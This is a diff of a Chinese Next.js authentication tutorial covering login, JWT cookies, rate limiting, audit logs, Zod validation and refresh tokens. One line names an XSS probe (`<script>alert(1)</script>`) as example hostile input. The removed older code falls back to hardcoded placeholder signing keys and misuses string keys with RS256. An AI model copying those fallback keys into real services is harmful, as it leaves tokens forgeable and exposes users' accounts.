-登录流程要验证三件事：
+登录比注册多一步——验证密码之后，要签发 JWT，设置 Cookie。
 
 ```typescript
-class AuthService {
-  /**
-   * 用户登录
-   */
-  async login(name: string, password: string): Promise<IDataResult<LoginResult>> {
-    try {
-      // 1. 查找用户
-      const user = await this.prisma.user.findFirst({
-        where: { name },
-      })
-
-      if (!user) {
-        // 注意：返回模糊的错误信息，防止用户探测
-        return {
-          code: -1,
-          message: '用户名或密码错误',
-          data: { user: null },
-        }
-      }
-
-      // 2. 验证密码（Argon2的verify方法会自动处理盐值）
-      const isPasswordValid = await verify(user.password, password)
-
-      if (!isPasswordValid) {
-        return {
-          code: -1,
-          message: '用户名或密码错误',
-          data: { user: null },
-        }
-      }
-
-      // 3. 生成JWT
-      const token = await this.generateToken({
-        userId: user.id,
-        name: user.name,
-      })
-
-      // 4. 设置Cookie
-      const cookieStore = await cookies()
-      cookieStore.set('auth_token', token, {
-        httpOnly: true,
-        secure: process.env.NODE_ENV === 'production',
-        sameSite: 'lax',
-        maxAge: 60 * 60 * 24 * 7, // 7天
-        path: '/',
-      })
-
-      return {
-        code: 0,
-        message: '登录成功',
-        data: {
-          user: {
-            id: user.id,
-            name: user.name,
-          },
-        },
-      }
-    } catch (error) {
-      console.error('登录失败:', error)
-      return {
-        code: -1,
-        message: '登录失败，请稍后重试',
-        data: { user: null },
-      }
-    }
+async function login(name: string, password: string) {
+  // 1. 找用户
+  const user = await prisma.user.findFirst({ where: { name } })
+  if (!user) {
+    // 注意：不要区分"用户不存在"还是"密码错误"
+    return { code: -1, message: '用户名或密码错误' }
   }
+
+  // 2. 验证密码 —— Argon2 的 verify 自动处理盐值
+  const isValid = await verify(user.password, password)
+  if (!isValid) {
+    return { code: -1, message: '用户名或密码错误' }
+  }
+
+  // 3. 签发 JWT
+  const token = await new SignJWT({
+    userId: user.id,
+    name: user.name,
+  })
+    .setProtectedHeader({ alg: 'RS256' })
+    .setExpirationTime('7d')
+    .sign(privateKey)
+
+  // 4. 设置 Cookie
+  const cookieStore = await cookies()
+  cookieStore.set('auth_token', token, {
+    httpOnly: true,
+    secure: process.env.NODE_ENV === 'production',
+    sameSite: 'lax',
+    maxAge: 60 * 60 * 24 * 7,
+    path: '/',
+  })
+
+  return { code: 0, message: '登录成功' }
 }
 ```
 
-> 小提示：为什么错误信息要写成"用户名或密码错误"而不是单独提示哪个错？因为如果分开提示，黑客就能知道哪个用户名已注册，方便他们"踩点"。
+为什么错误信息要写成"用户名或密码错误"而不是分开提示？
 
-### 4.3 会话检查：获取当前用户
+因为如果分开提示——"用户名不存在"vs"密码错误"——黑客就能通过尝试不同用户名来**探测哪些用户名已经注册**。这叫用户枚举攻击。一旦拿到了有效用户名列表，下一步就是针对性地尝试密码。所以错误信息要模糊，不给攻击者提供任何额外信息。
+
+### 检查当前用户
 
 ```typescript
-class AuthService {
-  /**
-   * 获取当前登录用户信息
-   */
-  async getCurrentUser(): Promise<JWTPayload | null> {
-    try {
-      const cookieStore = await cookies()
-      const token = cookieStore.get('auth_token')
+async function getCurrentUser() {
+  const cookieStore = await cookies()
+  const token = cookieStore.get('auth_token')?.value
 
-      if (!token) {
-        return null
-      }
+  if (!token) return null
 
-      return await this.verifyToken(token.value)
-    } catch (error) {
-      console.error('获取当前用户失败:', error)
-      return null
-    }
-  }
-
-  /**
-   * 检查是否已登录
-   */
-  async isAuthenticated(): Promise<boolean> {
-    const user = await this.getCurrentUser()
-    return user !== null
+  try {
+    const { payload } = await jwtVerify(token, publicKey)
+    return payload // { userId, name }
+  } catch {
+    return null // Token 过期或被篡改
   }
 }
 ```
 
-### 4.4 用户登出
+### 登出
+
+JWT 的无状态特性在这里有个小尴尬：登出只需要删除 Cookie 就够了——但 Token 本身还"活着"。如果有人在你登出之前截获了 Token，在它过期之前他还是能用。
 
 ```typescript
-class AuthService {
-  /**
-   * 退出登录
-   */
-  async logout(): Promise<IDataResult<boolean>> {
-    try {
-      const cookieStore = await cookies()
-
-      // 清除Cookie
-      cookieStore.delete('auth_token')
-
-      return {
-        code: 0,
-        message: '已退出登录',
-        data: true,
-      }
-    } catch (error) {
-      console.error('退出登录失败:', error)
-      return {
-        code: -1,
-        message: '退出登录失败',
-        data: false,
-      }
-    }
-  }
+async function logout() {
+  const cookieStore = await cookies()
+  cookieStore.delete('auth_token')
+  // Token 在服务器端还"有效"，但浏览器不会再发送它了
 }
 ```
+
+这个问题——"登出后 Token 还能用"——正是我们需要刷新令牌机制的原因之一。
 
 ---
 
-## 五、Next.js 15适配：Server Actions的优雅封装
+## 五、Next.js 15 的一个坑：Server Actions 不能导出类
 
-### 5.1 Server Actions的限制与应对
+Next.js 15 的 Server Actions 有个限制：`'use server'` 文件**只能导出普通函数，不能导出类或类的实例**。
 
-Next.js 15的Server Actions有一个限制：**只能导出函数，不能导出类或实例**。
-
-这并不意味着你要放弃面向对象的设计——我们可以在内部用类，对外暴露函数：
+这并不意味着你要放弃面向对象。你可以在内部用类组织逻辑，对外暴露函数：
 
 ```typescript
-// lib/auth-actions.ts
+// lib/auth-service.ts —— 内部实现，面向对象
+class AuthService {
+  async register(name: string, password: string) {
+    /* ... */
+  }
+  async login(name: string, password: string) {
+    /* ... */
+  }
+  async logout() {
+    /* ... */
+  }
+  async getCurrentUser() {
+    /* ... */
+  }
+}
+
+// lib/auth-actions.ts —— 对外暴露，函数式
 import { AuthService } from './auth-service'
 
-// 内部创建服务实例
 const authService = new AuthService()
 
-/**
- * 注册用户
- */
 export async function register(formData: FormData) {
   const name = formData.get('name') as string
   const password = formData.get('password') as string
-
   return await authService.register(name, password)
 }
 
-/**
- * 登录用户
- */
 export async function login(formData: FormData) {
   const name = formData.get('name') as string
   const password = formData.get('password') as string
-
   return await authService.login(name, password)
 }
 
-/**
- * 退出登录
- */
 export async function logout() {
   return await authService.logout()
 }
-
-/**
- * 检查登录状态
- */
-export async function checkAuth() {
-  return await authService.isAuthenticated()
-}
 ```
 
-这种设计的精妙之处：
-
-- **对外接口**：简洁的函数式API，符合Server Actions规范
-- **内部实现**：面向对象的服务类，保证代码的组织性和可测试性
-
-### 5.2 前端怎么用？
-
-**注册表单：**
-
-```tsx
-'use server'
-
-import { register } from '@/lib/auth-actions'
-
-export default function RegisterPage() {
-  async function handleSubmit(formData: FormData) {
-    const result = await register(formData)
-
-    if (result.code === 0) {
-      // 跳转到登录页
-      redirect('/login')
-    } else {
-      // 显示错误
-      alert(result.message)
-    }
-  }
-
-  return (
-    <form action={handleSubmit}>
-      <input name="name" placeholder="用户名" />
-      <input name="password" type="password" placeholder="密码" />
-      <button type="submit">注册</button>
-    </form>
-  )
-}
-```
-
-**登录表单：**
-
-```tsx
-'use server'
-
-import { login } from '@/lib/auth-actions'
-import { redirect } from 'next/navigation'
-
-export default function LoginPage() {
-  async function handleSubmit(formData: FormData) {
-    const result = await login(formData)
-
-    if (result.code === 0) {
-      redirect('/dashboard')
-    } else {
-      alert(result.message)
-    }
-  }
-
-  return (
-    <form action={handleSubmit}>
-      <input name="name" placeholder="用户名" />
-      <input name="password" type="password" placeholder="密码" />
-      <button type="submit">登录</button>
-    </form>
-  )
-}
-```
+这个模式的好处：内部逻辑组织清晰、单元测试方便、业务逻辑可复用。对外则是干净的函数式 API，完全符合 Next.js 的规范。
 
 ---
 
-## 六、前端集成：React Hook的最佳实践
+## 六、前端：用 Hook 管住状态
 
-### 6.1 自定义Hook封装认证状态
-
-在客户端，我们可以用自定义Hook来管理认证状态：
+在客户端，你需要知道"当前用户是登录还是没登录"。一个自定义 Hook 就够了：
 
 ```typescript
-import { useState, useEffect, useCallback } from 'react'
-import { checkAuth } from '@/lib/auth-actions'
-
-interface User {
-  userId: string
-  name: string
-}
-
-export function useAuth() {
+function useAuth() {
   const [user, setUser] = useState<User | null>(null)
   const [loading, setLoading] = useState(true)
 
-  // 检查登录状态
-  const checkAuthStatus = useCallback(async () => {
+  const checkAuth = useCallback(async () => {
     setLoading(true)
     try {
-      const userData = await checkAuth()
+      const userData = await fetchCurrentUser()
       setUser(userData)
-    } catch (error) {
-      console.error('认证检查失败:', error)
+    } catch {
       setUser(null)
     } finally {
       setLoading(false)
     }
   }, [])
 
-  // 组件挂载时检查一次
   useEffect(() => {
-    checkAuthStatus()
-  }, [checkAuthStatus])
-
-  // 刷新认证状态（登录后、登出后调用）
-  const refreshAuth = useCallback(() => {
-    checkAuthStatus()
-  }, [checkAuthStatus])
+    checkAuth()
+  }, [checkAuth])
 
   return {
     user,
     loading,
     isAuthenticated: user !== null,
-    refreshAuth,
+    refresh: checkAuth,
   }
 }
 ```
 
-### 6.2 在页面中使用
+在页面里用：
 
 ```tsx
-'use client'
+function DashboardPage() {
+  const { user, loading, isAuthenticated, refresh } = useAuth()
 
-import { useAuth } from '@/hooks/useAuth'
-import { logout } from '@/lib/auth-actions'
-import { useRouter } from 'next/navigation'
-
-export default function DashboardPage() {
-  const { user, loading, isAuthenticated, refreshAuth } = useAuth()
-  const router = useRouter()
-
-  async function handleLogout() {
-    await logout()
-    refreshAuth()
-    router.push('/login')
-  }
-
-  if (loading) {
-    return <div className="loading">加载中...</div>
-  }
-
-  if (!isAuthenticated) {
-    return <div className="not-logged-in">请先登录</div>
-  }
+  if (loading) return <div>加载中...</div>
+  if (!isAuthenticated) return <div>请先登录</div>
 
   return (
-    <div className="dashboard">
-      <h1>欢迎回来，{user?.name}！</h1>
-      <p>这是你的专属仪表盘</p>
-      <button onClick={handleLogout}>退出登录</button>
+    <div>
+      <h1>欢迎回来，{user.name}</h1>
+      <button
+        onClick={async () => {
+          await logout()
+          refresh()
+        }}
+      >
+        退出登录
+      </button>
     </div>
   )
 }
@@ -791,828 +603,394 @@ export default function DashboardPage() {
 
 ---
 
-## 七、安全加固：生产环境必备
+## 七、别只存密码和发 Token——打上三层补丁
 
-### 7.1 输入验证：Zod的运行时保护
+### 速率限制：夜店保安
 
-服务端验证永远不能少。Zod能在运行时检查数据类型：
+你去一个夜店，门口一个大哥拦住你："今晚最多试三张身份证，三张都不对，你就在外面等一小时。"
 
-```typescript
-import { z } from 'zod'
-
-// 定义验证规则
-const loginSchema = z.object({
-  name: z.string().min(1, '用户名不能为空').max(50, '用户名过长'),
-  password: z.string().min(6, '密码至少6位').max(100, '密码过长'),
-})
-
-// 在登录函数中使用
-async function login(formData: FormData) {
-  const name = formData.get('name') as string
-  const password = formData.get('password') as string
-
-  // 验证输入
-  const result = loginSchema.safeParse({ name, password })
-
-  if (!result.success) {
-    return {
-      code: -1,
-      message: result.error.errors[0].message,
-      data: { user: null },
-    }
-  }
-
-  // 验证通过，继续业务逻辑
-}
-```
-
-### 7.2 速率限制：防止暴力破解
-
-黑客可以用程序疯狂尝试各种密码组合，这就是"暴力破解"。速率限制能堵住这条路：
+速率限制就是这个大门保安。防止有人用脚本暴力尝试密码。
 
 ```typescript
 import { RateLimiter } from 'rate-limiter-flexible'
 
-// 基于IP的限流器
-const ipRateLimiter = new RateLimiter({
-  points: 10, // 10次机会
-  duration: 60, // 60秒内
-  blockDuration: 300, // 被封5分钟
+// 按 IP 限制
+const ipLimiter = new RateLimiter({
+  points: 10, // 10 次尝试
+  duration: 60, // 60 秒内
+  blockDuration: 300, // 超过了封 5 分钟
 })
 
-// 基于用户名的限流器（防止一个人锁定别人账户）
-const usernameRateLimiter = new RateLimiter({
-  points: 5, // 5次机会
-  duration: 900, // 15分钟内
-  blockDuration: 900, // 被封15分钟
+// 按用户名限制——防止一个人用字典攻击锁定某个账户
+const usernameLimiter = new RateLimiter({
+  points: 5, // 5 次尝试
+  duration: 900, // 15 分钟内
+  blockDuration: 900,
 })
 
-async function login(name: string, password: string) {
-  // 检查IP是否被限流
-  const ipKey = 'login:' + getClientIP()
+async function login(ip: string, name: string, password: string) {
   try {
-    await ipRateLimiter.consume(ipKey)
-  } catch (error) {
-    return {
-      code: -1,
-      message: '操作过于频繁，请稍后再试',
-      data: { user: null },
-    }
+    await ipLimiter.consume(ip)
+  } catch {
+    return { code: -1, message: '操作过于频繁，请稍后再试' }
   }
-
-  // 检查用户名是否被限流
   try {
-    await usernameRateLimiter.consume(name)
-  } catch (error) {
-    return {
-      code: -1,
-      message: '该账户登录尝试过多，请15分钟后再试',
-      data: { user: null },
-    }
+    await usernameLimiter.consume(name)
+  } catch {
+    return { code: -1, message: '该账户尝试过多，请15分钟后再试' }
   }
-
-  // 原有登录逻辑...
+  // ... 正常登录逻辑
 }
 ```
 
-### 7.3 审计日志：记录每一次认证事件
+### 审计日志：监控摄像头
 
-审计日志是安全的最后一道防线。出了问题，有据可查：
+你在商场里，头顶全是摄像头。你没犯事的时候它们只是安静地录着。万一有事情，调监控就能看到整个过程。
+
+审计日志就是这些摄像头。
 
 ```typescript
-class AuthService {
-  /**
-   * 记录审计日志
-   */
-  private async createAuditLog(action: string, metadata: Record<string, any>, userId?: string) {
-    try {
-      await this.prisma.auditLog.create({
-        data: {
-          action,
-          userId,
-          metadata,
-          ipAddress: getClientIP(),
-          userAgent: getUserAgent(),
-          createdAt: new Date(),
-        },
-      })
-    } catch (error) {
-      // 审计日志失败不应该影响业务流程
-      console.error('审计日志写入失败:', error)
-    }
+async function createAuditLog(action: string, metadata: Record<string, any>, userId?: string) {
+  await prisma.auditLog.create({
+    data: {
+      action, // 'LOGIN_SUCCESS' / 'LOGIN_FAILED' / 'REGISTER'
+      userId,
+      metadata, // { reason: 'wrong_password', ip: '...' }
+      ipAddress: getClientIP(),
+      userAgent: getUserAgent(),
+    },
+  })
+}
+
+// 登录时记录
+async function login(name: string, password: string) {
+  // ... 验证逻辑 ...
+  if (!user) {
+    await createAuditLog('LOGIN_FAILED', { reason: 'user_not_found' })
+    return { code: -1, message: '用户名或密码错误' }
   }
-
-  /**
-   * 登录（带审计）
-   */
-  async login(name: string, password: string) {
-    try {
-      const user = await this.prisma.user.findFirst({ where: { name } })
-
-      if (!user) {
-        // 记录失败尝试（不包括"用户不存在"的细节）
-        await this.createAuditLog('LOGIN_FAILED', { reason: 'user_not_found' })
-        return { code: -1, message: '用户名或密码错误' }
-      }
-
-      const isValid = await verify(user.password, password)
-
-      if (!isValid) {
-        await this.createAuditLog('LOGIN_FAILED', {
-          reason: 'wrong_password',
-          userId: user.id,
-        })
-        return { code: -1, message: '用户名或密码错误' }
-      }
-
-      // 登录成功
-      await this.createAuditLog('LOGIN_SUCCESS', {
-        userId: user.id,
-      })
-
-      // 生成Token、设置Cookie...
-      return { code: 0, message: '登录成功' }
-    } catch (error) {
-      await this.createAuditLog('LOGIN_ERROR', {
-        error: (error as Error).message,
-      })
-      throw error
-    }
+  if (!isValid) {
+    await createAuditLog('LOGIN_FAILED', { reason: 'wrong_password', userId: user.id })
+    return { code: -1, message: '用户名或密码错误' }
   }
+  await createAuditLog('LOGIN_SUCCESS', { userId: user.id })
+  // ...
+}
+```
+
+审计日志有两个原则：
+
+1. 记录失败的尝试时，尽量详细（哪个 IP、什么原因、几点几分）。
+2. 审计日志本身失败了，不要影响业务流程——日志是辅助，不是阻断。
+
+### 输入验证：安检门
+
+在你注册页面的输入框里，有人输入了一段 SQL 语句怎么办？有人输入了 `<script>alert(1)</script>` 怎么办？有人输入了一个 2MB 长的用户名字段怎么办？
+
+Zod 在服务端做输入验证就是你的安检门——不管你前端有没有验证，后端必须再验证一遍。因为前端验证可以被绕过——curl 一个 POST 请求过去，你前端的所有 form validation 都形同虚设。
+
+```typescript
+const loginSchema = z.object({
+  name: z.string().min(1).max(50),
+  password: z.string().min(6).max(100),
+})
+
+// 在 login 函数里，第一件事就做这个
+const result = loginSchema.safeParse({ name, password })
+if (!result.success) {
+  return { code: -1, message: result.error.errors[0].message }
 }
 ```
 
 ---
 
-## 八、刷新令牌：生产环境的必备机制
+## 八、刷新令牌：解决 JWT 的核心矛盾
 
-### 8.1 单纯JWT的问题
+### 那个让你失眠的矛盾
 
-现在我们的JWT有效期是7天。但这里有个矛盾：
+回到 JWT 的最大痛点。
 
-- **Token太短**：用户每隔15分钟就要重新登录，体验很差
-- **Token太长**：万一Token泄露，黑客有充足的时间搞破坏
+Token 有效期太长 → 被盗后的攻击窗口太大，等于给黑客开了一个长假期。
 
-刷新令牌机制完美解决了这个矛盾：
+Token 有效期太短 → 用户每隔 15 分钟就要重新输密码登录，体验就是一坨屎。
+
+怎么破？
+
+### 回答：两个 Token，各司其职
+
+你去健身房办了一张会员卡。这张卡分两个部分：
+
+1. **入场手环**（短期，15 分钟有效）：进闸机用。丢了？没关系，15 分钟后自动失效。
+2. **续费卡**（长期，7 天有效）：手环快过期的时候，你拿续费卡去前台刷一下，换个新手环。不丢人，无感操作。
+
+在认证系统里：
+
+- **Access Token** = 入场手环。有效期 15 分钟。用于每次 API 请求的身份验证。丢了就丢了，攻击窗口只有 15 分钟。
+- **Refresh Token** = 续费卡。有效期 7 天。**只在刷新 Access Token 的时候使用**，平常不用，暴露风险极低。丢了？你可以随时去系统里撤销它。
 
 ```
-┌─────────────────────────────────────────────────────────────────┐
-│                         刷新令牌流程                              │
-├─────────────────────────────────────────────────────────────────┤
-│                                                                  │
-│  Access Token（短期）          Refresh Token（长期）             │
-│  ├─ 有效期：15分钟             ├─ 有效期：7天                    │
-│  ├─ 用于API访问                ├─ 用于获取新的Access Token        │
-│  ├─ 泄露后攻击窗口小            ├─ 泄露后可以撤销                  │
-│  └─ 可以频繁轮换                └─ 不频繁使用，减少暴露风险         │
-│                                                                  │
-│  用户操作流程：                                                   │
-│  1. 登录 → 返回Access Token + Refresh Token                      │
-│  2. 用Access Token访问API                                        │
-│  3. Access Token快过期 → 用Refresh Token换新的                   │
-│  4. Refresh Token也快过期 → 再换新的                             │
-│  5. 用户长期不用 → Refresh Token过期，重新登录                    │
-│                                                                  │
-└─────────────────────────────────────────────────────────────────┘
+用户操作流程：
+1. 登录         → 服务器发给你 Access Token + Refresh Token
+2. 正常用       → 拿着 Access Token 到处用
+3. Access 快过期 → 自动拿 Refresh Token 换一个新的 Access Token
+4. Refresh 也过期 → 重新登录吧，太久没来了
+5. 登出         → 服务器把 Refresh Token 标记为撤销
 ```
 
-### 8.2 三种设计方案的权衡
+### 三种实现方案的权衡
 
-#### 方案一：有状态刷新令牌
+**方案一：有状态（存库）**
 
-把Refresh Token存进数据库：
+把 Refresh Token 完整存进数据库。好处是控制力强——随时能撤销、能查设备列表、能记录日志。坏处是需要数据库存储，而且每次刷新都要查库。
+
+**方案二：无状态（纯 JWT）**
+
+Refresh Token 本身就是 JWT。好处是零数据库依赖，完全无状态。坏处是没法主动撤销——Token 一旦发出去，在过期之前它就是有效的。用户改密码了？之前的 Refresh Token 还能用，你想想这有多恐怖。
+
+**方案三：混合方案（只存元数据）** —— **这才是正确答案**
+
+Refresh Token 仍然是 JWT，但你在数据库里只存它的唯一标识（jti）和状态（是否被撤销）。不存完整的 Token。这样保持了大部分无状态特性，同时获得了撤销能力。
 
 ```prisma
-model RefreshToken {
+model RefreshTokenMetadata {
   id        String   @id @default(cuid())
-  token     String   @unique
+  jti       String   @unique    // JWT 里的唯一 ID
   userId    String
-  user      User     @relation(...)
   expiresAt DateTime
-  createdAt DateTime @default(now())
-  revoked   Boolean  @default(false)
+  revoked   Boolean  @default(false)  // 可以随时设为 true 来撤销
+  @@index([userId])
 }
 ```
 
-**优点**：
+### 完整实现
 
-- 可以随时撤销单个Token
-- 支持多设备管理
-- 可以记录使用日志
-
-**缺点**：
-
-- 需要数据库存储
-- 违背了JWT的无状态理念
-
-#### 方案二：无状态Refresh Token
-
-把Refresh Token也做成JWT：
+#### 签发 Access Token + Refresh Token
 
 ```typescript
-async function generateRefreshToken(userId: string): Promise<string> {
-  return await new SignJWT({ userId, type: 'refresh' })
+// Access Token: 15 分钟有效期
+async function generateAccessToken(userId: string, name: string) {
+  return await new SignJWT({ userId, name, type: 'access' })
     .setProtectedHeader({ alg: 'RS256' })
-    .setExpirationTime('7d')
-    .sign(refreshTokenPrivateKey) // 用不同的密钥
-}
-```
-
-**优点**：
-
-- 完全无状态
-- 不需要数据库存储
-- 实现简单
-
-**缺点**：
-
-- 无法主动撤销
-- 泄露后无法立即失效
-- 不支持精细的设备管理
-
-#### 方案三：混合方案（最佳选择）
-
-只存Token的元数据（jti），不存完整Token：
-
-```prisma
-model RefreshTokenMetadata {
-  id        String   @id @default(cuid())
-  jti       String   @unique  // JWT ID
-  userId    String
-  expiresAt DateTime
-  revoked   Boolean  @default(false)
-}
-```
-
-**优点**：
-
-- 可以通过jti撤销Token
-- 存储数据量很小（只有元数据）
-- 保持了大部分无状态特性
-
-**缺点**：
-
-- 稍微复杂一点
-
-**实际建议**：方案三是最佳平衡选择。新项目直接用这个。
-
-### 8.3 混合方案的完整实现
-
-#### 8.3.1 定义数据库模型
-
-```prisma
-// prisma/schema.prisma
-
-model User {
-  id           String   @id @default(cuid())
-  name         String   @unique
-  password     String   // Argon2哈希
-  createdAt    DateTime @default(now())
-  updatedAt    DateTime @updatedAt
-
-  refreshTokens RefreshTokenMetadata[]
-  auditLogs     AuditLog[]
+    .setIssuedAt()
+    .setExpirationTime('15m')
+    .sign(accessTokenPrivateKey)
 }
 
-model RefreshTokenMetadata {
-  id        String   @id @default(cuid())
-  jti       String   @unique  // JWT ID，用于撤销
-  userId    String
-  user      User     @relation(fields: [userId], references: [id], onDelete: Cascade)
-  expiresAt DateTime
-  revoked   Boolean  @default(false)
-  createdAt DateTime @default(now())
+// Refresh Token: 7 天有效期，附带 jti
+async function generateRefreshToken(userId: string) {
+  const jti = crypto.randomUUID()
+  const expiresAt = new Date(Date.now() + 7 * 24 * 60 * 60 * 1000)
 
-  @@index([userId])
-  @@index([jti])
-}
-
-model AuditLog {
-  id        String   @id @default(cuid())
-  action    String
-  userId    String?
-  user      User?    @relation(fields: [userId], references: [id])
-  metadata  Json?
-  ipAddress String?
-  userAgent String?
-  createdAt DateTime @default(now())
-
-  @@index([userId])
-  @@index([action])
-  @@index([createdAt])
-}
-```
-
-#### 8.3.2 AuthService完整实现
-
-```typescript
-import { SignJWT, jwtVerify, JWTPayload } from 'jose'
-import { cookies } from 'next/headers'
-import { PrismaClient } from '@prisma/client'
-
-const prisma = new PrismaClient()
-
-// 算法配置
-const ACCESS_TOKEN_ALGORITHM = 'RS256'
-const REFRESH_TOKEN_ALGORITHM = 'RS256'
-
-// 配置常量
-const ACCESS_TOKEN_EXPIRY = '15m' // 15分钟
-const REFRESH_TOKEN_EXPIRY = '7d' // 7天
-
-class AuthService {
-  private readonly prisma: PrismaClient
-
-  // 密钥（实际应该从环境变量加载）
-  private readonly accessTokenPrivateKey: Uint8Array
-  private readonly accessTokenPublicKey: Uint8Array
-  private readonly refreshTokenPrivateKey: Uint8Array
-  private readonly refreshTokenPublicKey: Uint8Array
-
-  constructor() {
-    this.prisma = prisma
-
-    // 初始化密钥（实际生产应该从安全的密钥管理系统加载）
-    // 这里用字符串转Uint8Array的简化示例
-    this.accessTokenPrivateKey = new TextEncoder().encode(process.env.JWT_PRIVATE_KEY || 'access-private-key')
-    this.accessTokenPublicKey = new TextEncoder().encode(process.env.JWT_PUBLIC_KEY || 'access-public-key')
-    this.refreshTokenPrivateKey = new TextEncoder().encode(process.env.REFRESH_PRIVATE_KEY || 'refresh-private-key')
-    this.refreshTokenPublicKey = new TextEncoder().encode(process.env.REFRESH_PUBLIC_KEY || 'refresh-public-key')
-  }
-
-  /**
-   * 生成Access Token（短期）
-   */
-  async generateAccessToken(payload: { userId: string; name: string }): Promise<string> {
-    return await new SignJWT(payload)
-      .setProtectedHeader({ alg: ACCESS_TOKEN_ALGORITHM })
-      .setIssuedAt()
-      .setExpirationTime(ACCESS_TOKEN_EXPIRY)
-      .sign(this.accessTokenPrivateKey)
-  }
-
-  /**
-   * 生成Refresh Token（JWT格式 + 元数据存储）
-   */
-  async generateRefreshToken(userId: string): Promise<string> {
-    // 生成唯一的JWT ID
-    const jti = crypto.randomUUID()
-
-    // 计算过期时间
-    const expiresAt = new Date()
-    expiresAt.setDate(expiresAt.getDate() + 7)
-
-    // 存储元数据（只存jti，不存完整的token）
-    await this.prisma.refreshTokenMetadata.create({
-      data: {
-        jti,
-        userId,
-        expiresAt,
-      },
-    })
-
-    // 生成JWT格式的Refresh Token
-    return await new SignJWT({
-      userId,
-      jti,
-      type: 'refresh',
-    })
-      .setProtectedHeader({ alg: REFRESH_TOKEN_ALGORITHM })
-      .setIssuedAt()
-      .setExpirationTime(REFRESH_TOKEN_EXPIRY)
-      .setJti(jti)
-      .sign(this.refreshTokenPrivateKey)
-  }
-
-  /**
-   * 验证Refresh Token
-   */
-  async verifyRefreshToken(token: string): Promise<{
-    isValid: boolean
-    userId?: string
-    jti?: string
-  }> {
-    try {
-      // 1. 验证JWT签名和过期时间
-      const { payload } = await jwtVerify(token, this.refreshTokenPublicKey, {
-        algorithms: [REFRESH_TOKEN_ALGORITHM],
-      })
-
-      const { userId, jti, type } = payload as any
-
-      if (type !== 'refresh' || !userId || !jti) {
-        return { isValid: false }
-      }
-
-      // 2. 检查元数据是否被撤销
-      const metadata = await this.prisma.refreshTokenMetadata.findUnique({
-        where: { jti },
-      })
-
-      if (!metadata) {
-        return { isValid: false }
-      }
-
-      if (metadata.revoked) {
-        return { isValid: false }
-      }
-
-      // 3. 检查是否已过期（双重检查）
-      if (metadata.expiresAt < new Date()) {
-        return { isValid: false }
-      }
-
-      return { isValid: true, userId, jti }
-    } catch (error) {
-      console.error('Refresh Token验证失败:', error)
-      return { isValid: false }
-    }
-  }
-
-  /**
-   * 撤销单个Refresh Token
-   */
-  async revokeRefreshToken(jti: string): Promise<void> {
-    await this.prisma.refreshTokenMetadata.update({
-      where: { jti },
-      data: { revoked: true },
-    })
-  }
-
-  /**
-   * 撤销用户的所有Refresh Token（用于"退出所有设备"）
-   */
-  async revokeAllUserRefreshTokens(userId: string): Promise<void> {
-    await this.prisma.refreshTokenMetadata.updateMany({
-      where: {
-        userId,
-        revoked: false,
-      },
-      data: { revoked: true },
-    })
-  }
-
-  /**
-   * 清理过期的Refresh Token元数据
-   */
-  async cleanupExpiredRefreshTokens(): Promise<number> {
-    const result = await this.prisma.refreshTokenMetadata.deleteMany({
-      where: {
-        expiresAt: {
-          lt: new Date(),
-        },
-      },
-    })
-    return result.count
-  }
-
-  /**
-   * 登录（新版，带刷新令牌）
-   */
-  async login(name: string, password: string) {
-    try {
-      // 1. 查找用户
-      const user = await this.prisma.user.findUnique({ where: { name } })
-
-      if (!user) {
-        return { code: -1, message: '用户名或密码错误' }
-      }
-
-      // 2. 验证密码
-      const isValid = await verify(user.password, password)
-      if (!isValid) {
-        return { code: -1, message: '用户名或密码错误' }
-      }
-
-      // 3. 生成Access Token和Refresh Token
-      const accessToken = await this.generateAccessToken({
-        userId: user.id,
-        name: user.name,
-      })
-      const refreshToken = await this.generateRefreshToken(user.id)
-
-      // 4. 设置Cookie
-      const cookieStore = await cookies()
-
-      // Access Token：短期，path=/ 全站可用
-      cookieStore.set('access_token', accessToken, {
-        httpOnly: true,
-        secure: process.env.NODE_ENV === 'production',
-        sameSite: 'lax',
-        maxAge: 15 * 60, // 15分钟
-        path: '/',
-      })
-
-      // Refresh Token：长期，path=/api/auth/refresh 只在刷新时用
-      cookieStore.set('refresh_token', refreshToken, {
-        httpOnly: true,
-        secure: process.env.NODE_ENV === 'production',
-        sameSite: 'lax',
-        maxAge: 7 * 24 * 60 * 60, // 7天
-        path: '/api/auth/refresh', // 关键：只在刷新接口发送
-      })
-
-      return {
-        code: 0,
-        message: '登录成功',
-        data: {
-          user: { id: user.id, name: user.name },
-        },
-      }
-    } catch (error) {
-      console.error('登录失败:', error)
-      return { code: -1, message: '登录失败' }
-    }
-  }
-
-  /**
-   * 刷新Access Token
-   */
-  async refreshAccessToken(): Promise<{
-    success: boolean
-    accessToken?: string
-    error?: string
-  }> {
-    try {
-      const cookieStore = await cookies()
-      const refreshToken = cookieStore.get('refresh_token')?.value
-
-      if (!refreshToken) {
-        return { success: false, error: '未提供刷新令牌' }
-      }
-
-      // 验证Refresh Token
-      const verification = await this.verifyRefreshToken(refreshToken)
-
-      if (!verification.isValid || !verification.userId) {
-        return { success: false, error: '刷新令牌无效或已过期' }
-      }
-
-      // 获取用户信息
-      const user = await this.prisma.user.findUnique({
-        where: { id: verification.userId },
-      })
-
-      if (!user) {
-        return { success: false, error: '用户不存在' }
-      }
-
-      // 生成新的Access Token
-      const newAccessToken = await this.generateAccessToken({
-        userId: user.id,
-        name: user.name,
-      })
-
-      // 设置新的Access Token Cookie
-      cookieStore.set('access_token', newAccessToken, {
-        httpOnly: true,
-        secure: process.env.NODE_ENV === 'production',
-        sameSite: 'lax',
-        maxAge: 15 * 60,
-        path: '/',
-      })
-
-      return { success: true, accessToken: newAccessToken }
-    } catch (error) {
-      console.error('刷新令牌失败:', error)
-      return { success: false, error: '刷新失败' }
-    }
-  }
-
-  /**
-   * 退出登录
-   */
-  async logout(): Promise<void> {
-    try {
-      const cookieStore = await cookies()
-      const refreshToken = cookieStore.get('refresh_token')?.value
-
-      // 如果有Refresh Token，撤销它
-      if (refreshToken) {
-        try {
-          const verification = await this.verifyRefreshToken(refreshToken)
-          if (verification.jti) {
-            await this.revokeRefreshToken(verification.jti)
-          }
-        } catch {
-          // 忽略错误，可能token已过期
-        }
-      }
-
-      // 清除Cookie
-      cookieStore.delete('access_token')
-      cookieStore.delete('refresh_token')
-    } catch (error) {
-      console.error('退出登录失败:', error)
-    }
-  }
-
-  /**
-   * 获取当前用户
-   */
-  async getCurrentUser(): Promise<JWTPayload | null> {
-    try {
-      const cookieStore = await cookies()
-      const accessToken = cookieStore.get('access_token')?.value
-
-      if (!accessToken) {
-        return null
-      }
-
